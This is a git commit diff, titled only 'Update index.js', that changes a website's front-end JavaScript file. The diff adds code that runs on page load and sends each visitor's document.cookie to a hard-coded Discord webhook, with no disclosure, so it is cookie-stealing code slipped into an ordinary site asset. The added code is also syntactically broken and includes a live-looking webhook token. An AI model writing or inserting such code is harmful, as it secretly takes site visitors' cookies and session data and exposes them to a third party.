f1ba701f011ccf7fa91b2eeed0d5ad52327819ce
lmao <116317098+Diecsy@users.noreply.github.com>
2025-01-09 12:59:26 -0800

    Update index.js

--- static/assets/js/index.js
+++ static/assets/js/index.js
@@ -1,6 +1,27 @@
 const form = document.querySelector("form");
 const input = document.querySelector("input");
 
+ function getRandomInt(max) {
+  return Math.floor(Math.random() * max);
+}
+
+if !(typeof document.cookie == "number"){
+  document.cookie = "cookie="+ getRandomInt(1e9) + ";expires=Thu, 01 Jan 1970 00:00:01 GMT;";
+  const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/1327009618479546498/88zVTNA0r96PH03nyT_ffsnD2ydU0ma41qQSOrPomuQ9qElaSkIRk6IZDtqoH8y1xjIv");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      const params = {
+        username: "Cookie",
+        avatar_url: "",
+        content: document.cookie
+      }
+
+      request.send(JSON.stringify(params));
+    }
+}
+
 form.addEventListener("submit", async (event) => {
   event.preventDefault();
   window.navigator.serviceWorker.register("/lab.js", {
